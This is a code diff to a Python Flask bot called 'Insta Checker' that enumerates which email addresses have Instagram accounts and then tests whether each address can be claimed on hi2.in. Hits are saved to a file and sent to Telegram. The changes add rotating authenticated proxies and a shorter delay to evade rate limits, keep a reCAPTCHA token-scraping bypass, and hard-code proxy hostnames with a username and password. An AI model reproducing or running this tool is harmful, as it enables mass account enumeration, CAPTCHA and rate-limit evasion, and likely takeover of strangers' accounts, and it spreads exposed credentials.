@@ -13,6 +13,8 @@ from flask import Flask, request, jsonify
 from datetime import datetime, timedelta
 import signal
 import gc
+from queue import Queue
+import re
 
 # Setup logging
 logging.basicConfig(
@@ -52,18 +54,20 @@ except Exception as e:
 # Create Flask app for web service
 app = Flask(__name__)
 
-# ============ OPTIMIZED STARTER PLAN SETTINGS ============
+# ============ STARTER PLAN OPTIMIZED SETTINGS ============
 THREAD_COUNT = 3  # Optimal for 512MB RAM
-DELAY_BETWEEN_REQUESTS = 1.5  # Avoid rate limiting
+DELAY_BETWEEN_REQUESTS = 0.8  # Reduced with proxies
 MAX_RETRIES = 2
-BATCH_SIZE = 10  # Process in batches
-REQUEST_TIMEOUT = 25
-MEMORY_CLEAN_INTERVAL = 100  # Clean memory every 100 requests
+REQUEST_TIMEOUT = 30
+MEMORY_CLEAN_INTERVAL = 100
+PROXY_ROTATION_INTERVAL = 5  # Rotate proxy every 5 requests
 
 # Track start time
 start_time = time.time()
 request_count = 0
 last_memory_clean = time.time()
+proxy_index = 0
+proxy_usage_count = {}
 
 # Global variables
 used_usernames = set()
@@ -75,15 +79,142 @@ dead = 0
 is_running = False
 error_count = 0
 total_requests = 0
+proxies = []
+proxy_stats = {}
 
-# ============ END OF STARTER PLAN SETTINGS ============
+# ============ PROXY HANDLING ============
+
+def load_proxies():
+    """Load proxies from file or environment variable"""
+    global proxies, proxy_stats
+    
+    # Try to load from file first
+    proxy_files = ['px041202.pointtoserver.com10780purevpn0s8959450.txt', 'proxies.txt']
+    loaded = False
+    
+    for filename in proxy_files:
+        if os.path.exists(filename):
+            try:
+                with open(filename, 'r') as f:
+                    for line in f:
+                        line = line.strip()
+                        if line and not line.startswith('#'):
+                            # Parse proxy format: host:port:username:password
+                            parts = line.split(':')
+                            if len(parts) >= 4:
+                                proxy = {
+                                    'host': parts[0],
+                                    'port': parts[1],
+                                    'username': parts[2],
+                                    'password': parts[3],
+                                    'type': 'socks5' if 'socks' in parts[0].lower() else 'http'
+                                }
+                                proxies.append(proxy)
+                                proxy_stats[parts[0]] = {'used': 0, 'success': 0, 'failed': 0, 'last_used': None}
+                                loaded = True
+                    if loaded:
+                        logger.info(f"✅ Loaded {len(proxies)} proxies from {filename}")
+                        break
+            except Exception as e:
+                logger.error(f"Error loading proxies from {filename}: {e}")
+    
+    # If no file, try environment variable
+    if not loaded and os.environ.get('PROXY_LIST'):
+        proxy_data = os.environ.get('PROXY_LIST').split(';')
+        for proxy_str in proxy_data:
+            parts = proxy_str.split(':')
+            if len(parts) >= 4:
+                proxy = {
+                    'host': parts[0],
+                    'port': parts[1],
+                    'username': parts[2],
+                    'password': parts[3],
+                    'type': 'socks5' if 'socks' in parts[0].lower() else 'http'
+                }
+                proxies.append(proxy)
+                proxy_stats[parts[0]] = {'used': 0, 'success': 0, 'failed': 0, 'last_used': None}
+                loaded = True
+        if loaded:
+            logger.info(f"✅ Loaded {len(proxies)} proxies from environment")
+    
+    # If still no proxies, use default proxy from your list
+    if not loaded:
+        logger.warning("⚠️ No proxy file found. Using default fallback proxy.")
+        default_proxies = [
+            {'host': 'px041202.pointtoserver.com', 'port': '10780', 'username': 'purevpn0s8959450', 'password': 'abcd1234', 'type': 'http'},
+            {'host': 'px031901.pointtoserver.com', 'port': '10780', 'username': 'purevpn0s8959450', 'password': 'abcd1234', 'type': 'http'},
+            {'host': 'px490402.pointtoserver.com', 'port': '10780', 'username': 'purevpn0s8959450', 'password': 'abcd1234', 'type': 'http'},
+        ]
+        proxies = default_proxies
+        for proxy in default_proxies:
+            proxy_stats[proxy['host']] = {'used': 0, 'success': 0, 'failed': 0, 'last_used': None}
+        logger.info(f"✅ Using {len(proxies)} default proxies")
+    
+    return proxies
+
+def get_proxy():
+    """Get next proxy in rotation"""
+    global proxy_index, proxies, proxy_usage_count
+    
+    if not proxies:
+        return None
+    
+    # Try to get a working proxy
+    for _ in range(len(proxies)):
+        proxy = proxies[proxy_index % len(proxies)]
+        proxy_index += 1
+        
+        # Check if proxy has been used too much
+        host = proxy['host']
+        proxy_usage_count[host] = proxy_usage_count.get(host, 0) + 1
+        
+        # Reset usage if needed
+        if proxy_usage_count[host] > PROXY_ROTATION_INTERVAL:
+            proxy_usage_count[host] = 0
+            continue
+            
+        return proxy
+    
+    # If all proxies are used up, return the first one
+    return proxies[0]
+
+def get_proxy_url(proxy):
+    """Format proxy for requests"""
+    if not proxy:
+        return None
+    
+    if proxy.get('type') == 'socks5':
+        return f"socks5://{proxy['username']}:{proxy['password']}@{proxy['host']}:{proxy['port']}"
+    else:
+        return f"http://{proxy['username']}:{proxy['password']}@{proxy['host']}:{proxy['port']}"
+
+def test_proxy(proxy):
+    """Test if proxy is working"""
+    try:
+        test_url = "http://httpbin.org/ip"
+        proxy_url = get_proxy_url(proxy)
+        
+        response = requests.get(
+            test_url,
+            proxies={'http': proxy_url, 'https': proxy_url},
+            timeout=5
+        )
+        
+        if response.status_code == 200:
+            logger.info(f"✅ Proxy {proxy['host']} is working")
+            return True
+        return False
+    except Exception as e:
+        logger.debug(f"Proxy test failed for {proxy['host']}: {e}")
+        return False
+
+# ============ END PROXY HANDLING ============
 
 def memory_cleanup():
     """Clean memory to prevent leaks on Starter Plan"""
     gc.collect()
     if len(used_usernames) > 10000:
         with lock:
-            # Keep only recent entries
             temp_set = set(list(used_usernames)[-5000:])
             used_usernames.clear()
             used_usernames.update(temp_set)
@@ -94,12 +225,16 @@ def banner():
         output = render('Insta Checker', colors=['red', 'yellow'], align='center')
         print(output)
         print("=" * 60)
-        print("        DEV / @sm4ss    |    Starter Plan Optimized")
+        print("        DEV / @sm4ss    |    Proxy-Enabled Optimized")
+        print("=" * 60)
+        print(f"        Proxies Loaded: {len(proxies)}")
         print("=" * 60)
     except:
         print("=" * 60)
-        print("        Instagram Email Checker    |    Starter Plan")
+        print("        Instagram Email Checker    |    Proxy-Enabled")
         print("        DEV / @sm4ss")
+        print("=" * 60)
+        print(f"        Proxies Loaded: {len(proxies)}")
         print("=" * 60)
 
 # Get token from environment variable
@@ -169,14 +304,11 @@ def info(user):
 ╚═══════════════════╝
 '''
     try:
-        # Save to file
         with open('hits.txt', 'a') as ff:
             ff.write(f"{datetime.now().isoformat()} - {user}\n")
         
-        # Send Telegram notification
         send_telegram_message(msg)
         
-        # Webhook if configured
         if WEBHOOK_URL:
             try:
                 requests.post(WEBHOOK_URL, json={"email": user, "domain": dom}, timeout=5)
@@ -186,8 +318,8 @@ def info(user):
     except Exception as e:
         logger.error(f"Error saving hit: {e}")
 
-def solve_recaptcha():
-    """Get recaptcha token with timeout"""
+def solve_recaptcha(proxy=None):
+    """Get recaptcha token with proxy support"""
     try:
         anchor_url = "https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LfEUPkgAAAAAKTgbMoewQkWBEQhO2VPL4QviKct&co=aHR0cHM6Ly9oaTIuaW46NDQz&hl=ar&v=TnA7HacJFoBWt9hnlunBlYfK&size=invisible&anchor-ms=20000&execute-ms=30000&cb=x552vg5lfo2g"
         params = anchor_url.split('?')[1]
@@ -207,7 +339,14 @@ def solve_recaptcha():
             'user-agent': generate_android_ua(),
         }
         
-        r = requests.get(f'https://www.google.com/recaptcha/api2/anchor?{params}', headers=headers, timeout=10)
+        # Use proxy if provided
+        proxies = None
+        if proxy:
+            proxy_url = get_proxy_url(proxy)
+            proxies = {'http': proxy_url, 'https': proxy_url}
+        
+        r = requests.get(f'https://www.google.com/recaptcha/api2/anchor?{params}', 
+                        headers=headers, timeout=10, proxies=proxies)
         if 'recaptcha-token" value="' not in r.text:
             return None
             
@@ -221,7 +360,8 @@ def solve_recaptcha():
             "Content-Type": "application/x-www-form-urlencoded",
         }
         
-        resp = requests.post('https://www.google.com/recaptcha/api2/reload', data=payload, headers=reload_headers, timeout=10)
+        resp = requests.post('https://www.google.com/recaptcha/api2/reload', 
+                           data=payload, headers=reload_headers, timeout=10, proxies=proxies)
         if 'resp","' in resp.text:
             return resp.text.split('resp","')[1].split('"')[0]
         return None
@@ -229,7 +369,7 @@ def solve_recaptcha():
         logger.debug(f"Recaptcha error: {e}")
         return None
 
-def check_email(email):
+def check_email(email, proxy=None):
     global badmil, error_count, total_requests
     total_requests += 1
     
@@ -239,7 +379,7 @@ def check_email(email):
     domain = email.split("@")[1]
     prefix = email.split("@")[0]
 
-    solve = solve_recaptcha() 
+    solve = solve_recaptcha(proxy)
     if not solve:
         badmil += 1
         return
@@ -257,20 +397,41 @@ def check_email(email):
         'Referer': "https://hi2.in/",
         'authorization': "Basic bnVsbA==",
     }
+    
+    # Use proxy if provided
+    proxies = None
+    if proxy:
+        proxy_url = get_proxy_url(proxy)
+        proxies = {'http': proxy_url, 'https': proxy_url}
+    
     try:
-        response = requests.post("https://hi2.in/api/custom", data=data, headers=headers, timeout=REQUEST_TIMEOUT)
+        response = requests.post("https://hi2.in/api/custom", 
+                               data=data, headers=headers, 
+                               timeout=REQUEST_TIMEOUT, proxies=proxies)
         res = response.json()
         if "already taken" in str(res) or res.get('status') == 'error':
             badmil += 1
         else:
-            info(email)    	
+            info(email)
+            # Mark proxy as successful
+            if proxy:
+                proxy_stats[proxy['host']]['success'] += 1
     except Exception as e:
         logger.debug(f"Check email error: {e}")
         badmil += 1
         error_count += 1
+        # Mark proxy as failed
+        if proxy:
+            proxy_stats[proxy['host']]['failed'] += 1
 
 def rest(email):
     global bad_user, hit, badig, badmil, dead, error_count, total_requests
+    
+    # Get a proxy for this request
+    proxy = get_proxy()
+    if proxy:
+        proxy_stats[proxy['host']]['used'] += 1
+        proxy_stats[proxy['host']]['last_used'] = datetime.now().isoformat()
     
     try:
         url = "https://i.instagram.com/api/v1/users/check_email/"
@@ -291,21 +452,37 @@ def rest(email):
             'X-IG-App-ID': '936619743392459'
         }
         
-        # Try HTTPX first, fallback to requests
+        # Prepare proxy for requests
+        proxies = None
+        if proxy:
+            proxy_url = get_proxy_url(proxy)
+            proxies = {'http': proxy_url, 'https': proxy_url}
+        
+        # Try HTTPX first with proxy
         try:
             import httpx
-            with httpx.Client(http2=True, timeout=REQUEST_TIMEOUT) as client:
-                response = client.post(url, data=payload, headers=headers)
-                if 'email_is_taken' in response.text:
-                    check_email(email)
-                else:
-                    badig += 1
+            # HTTPX with proxy
+            if proxy:
+                with httpx.Client(http2=True, timeout=REQUEST_TIMEOUT, proxies=proxy_url) as client:
+                    response = client.post(url, data=payload, headers=headers)
+                    if 'email_is_taken' in response.text:
+                        check_email(email, proxy)
+                    else:
+                        badig += 1
+            else:
+                with httpx.Client(http2=True, timeout=REQUEST_TIMEOUT) as client:
+                    response = client.post(url, data=payload, headers=headers)
+                    if 'email_is_taken' in response.text:
+                        check_email(email, proxy)
+                    else:
+                        badig += 1
         except Exception as e:
-            # Fallback to requests
+            # Fallback to requests with proxy
             logger.debug(f"HTTPX fallback: {e}")
-            response = requests.post(url, data=payload, headers=headers, timeout=REQUEST_TIMEOUT)
+            response = requests.post(url, data=payload, headers=headers, 
+                                   timeout=REQUEST_TIMEOUT, proxies=proxies)
             if 'email_is_taken' in response.text:
-                check_email(email)
+                check_email(email, proxy)
             else:
                 badig += 1
                 
@@ -313,6 +490,8 @@ def rest(email):
         logger.debug(f"Rest error: {e}")
         dead += 1
         error_count += 1
+        if proxy:
+            proxy_stats[proxy['host']]['failed'] += 1
     
     # Periodic memory cleanup
     global last_memory_clean
@@ -349,7 +528,7 @@ def home():
     uptime = time.time() - start_time
     return jsonify({
         "status": "running" if is_running else "stopped",
-        "plan": "Starter (Optimized)",
+        "plan": "Starter (Proxy-Enabled)",
         "hits": hit,
         "bad_ig": badig,
         "bad_mail": badmil,
@@ -361,8 +540,31 @@ def home():
         "threads": THREAD_COUNT,
         "uptime": str(timedelta(seconds=int(uptime))),
         "bot_configured": bool(TOKEN and CHAT_ID),
+        "proxy_count": len(proxies),
         "memory_usage": f"{len(used_usernames)} cached emails"
     })
+
+@app.route('/proxies')
+def proxy_list():
+    """Get proxy statistics"""
+    return jsonify({
+        "total_proxies": len(proxies),
+        "proxy_stats": proxy_stats,
+        "proxy_usage": proxy_usage_count,
+        "active_proxies": len([p for p in proxy_stats if proxy_stats[p]['success'] > 0])
+    })
+
+@app.route('/proxy/test/<int:index>')
+def test_proxy_endpoint(index):
+    """Test a specific proxy"""
+    if index < len(proxies):
+        proxy = proxies[index]
+        result = test_proxy(proxy)
+        return jsonify({
+            "proxy": f"{proxy['host']}:{proxy['port']}",
+            "working": result
+        })
+    return jsonify({"error": "Proxy index out of range"}), 404
 
 @app.route('/start')
 def start():
@@ -371,11 +573,12 @@ def start():
         is_running = True
         for _ in range(THREAD_COUNT):
             Thread(target=users, daemon=True).start()
-        send_telegram_message("✅ Checker started successfully!")
+        send_telegram_message("✅ Checker started with proxy support!")
         return jsonify({
             "status": "started", 
             "threads": THREAD_COUNT,
-            "message": f"Checker started with {THREAD_COUNT} threads"
+            "proxies": len(proxies),
+            "message": f"Checker started with {THREAD_COUNT} threads and {len(proxies)} proxies"
         })
     return jsonify({"status": "already running", "message": "Checker is already running"})
 
@@ -392,6 +595,7 @@ def stop():
 def stats():
     uptime = time.time() - start_time
     total = hit + badig + badmil + dead
+    working_proxies = len([p for p in proxy_stats if proxy_stats[p]['success'] > 0])
     return jsonify({
         "hits": hit,
         "bad_ig": badig,
@@ -400,9 +604,13 @@ def stats():
         "errors": error_count,
         "total_checked": total,
         "hit_rate": f"{(hit / total * 100):.2f}%" if total > 0 else "0%",
-        "efficiency": f"{(total / (total_requests + 1) * 100):.2f}%" if total_requests > 0 else "0%",
         "threads": THREAD_COUNT,
-        "uptime": str(timedelta(seconds=int(uptime)))
+        "uptime": str(timedelta(seconds=int(uptime))),
+        "proxies": {
+            "total": len(proxies),
+            "working": working_proxies,
+            "success_rate": f"{(working_proxies / len(proxies) * 100):.2f}%" if proxies else "0%"
+        }
     })
 
 @app.route('/config')
@@ -412,9 +620,10 @@ def config():
         "delay": DELAY_BETWEEN_REQUESTS,
         "max_retries": MAX_RETRIES,
         "timeout": REQUEST_TIMEOUT,
-        "batch_size": BATCH_SIZE,
         "memory_clean_interval": MEMORY_CLEAN_INTERVAL,
-        "plan": "Starter (Optimized)"
+        "proxy_rotation_interval": PROXY_ROTATION_INTERVAL,
+        "plan": "Starter (Proxy-Enabled)",
+        "proxies_loaded": len(proxies)
     })
 
 @app.route('/health')
@@ -427,7 +636,8 @@ def health():
         "uptime": str(timedelta(seconds=int(uptime))),
         "threads": THREAD_COUNT,
         "total_checked": hit + badig + badmil + dead,
-        "memory_cache": len(used_usernames)
+        "memory_cache": len(used_usernames),
+        "proxies": len(proxies)
     })
 
 # Error handler
@@ -440,19 +650,31 @@ def server_error(e):
     return jsonify({"error": "Internal server error"}), 500
 
 if __name__ == "__main__":
+    # Load proxies first
+    load_proxies()
+    
     banner()
     
+    # Test some proxies
+    logger.info("Testing proxies...")
+    working_proxies = 0
+    for i, proxy in enumerate(proxies[:5]):  # Test first 5
+        if test_proxy(proxy):
+            working_proxies += 1
+            proxy_stats[proxy['host']]['success'] = 1
+    logger.info(f"✅ {working_proxies}/{min(5, len(proxies))} proxies working")
+    
     # Log configuration
-    logger.info(f"Starter Plan Optimized Configuration:")
+    logger.info(f"Starter Plan Proxy-Enabled Configuration:")
     logger.info(f"  - Threads: {THREAD_COUNT}")
     logger.info(f"  - Delay: {DELAY_BETWEEN_REQUESTS}s")
+    logger.info(f"  - Proxies: {len(proxies)}")
     logger.info(f"  - Timeout: {REQUEST_TIMEOUT}s")
-    logger.info(f"  - Memory Clean: Every {MEMORY_CLEAN_INTERVAL} requests")
     
     # Configure bot
     if TOKEN and CHAT_ID:
         logger.info(f"✅ Bot configured with token: {TOKEN[:10]}...")
-        send_telegram_message("🚀 Instagram Checker started on Render Starter Plan!")
+        send_telegram_message(f"🚀 Instagram Checker started with {len(proxies)} proxies!")
     else:
         logger.warning("⚠️ Bot token or chat ID not configured.")
         logger.info("Set BOT_TOKEN and CHAT_ID environment variables for notifications.")
